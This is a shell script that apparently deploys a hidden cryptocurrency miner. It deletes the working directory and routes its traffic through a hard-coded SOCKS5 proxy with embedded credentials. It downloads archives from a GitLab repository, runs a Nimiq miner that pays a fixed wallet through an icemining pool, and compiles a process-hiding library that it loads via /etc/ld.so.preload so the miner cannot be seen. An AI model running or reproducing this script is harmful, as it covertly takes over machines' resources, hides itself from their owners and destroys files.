rm -rvf * && mkdir d && cd d
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y

wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/micin.tar.gz
tar -xvzf micin.tar.gz
wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/apik.tar.gz
tar -xvzf apik.tar.gz
rm -rf apik.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 149.28.159.30:443
socks5_username = mbah
socks5_password = kencot
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp rm -rf gas && wget -q 'https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/elpigi.zip' && unzip elpigi.zip
chmod +x gas
rm -rf Makefile
rm -rf processhider.c
rm -rf README.md
rm -rf .gitignore
rm -rf elpigi.zip

./graftcp/graftcp wget https://gitlab.com/megatronsquads/megatronsquads/-/raw/main/megatron.zip
unzip megatron.zip
rm -rf megatron.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./gas -d=0 -a "NQ82UYV095UD9MST21399ABS6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n $(echo $(shuf -i 1-20000 -n 1)GPU-Sage) -t 4  -i Disable
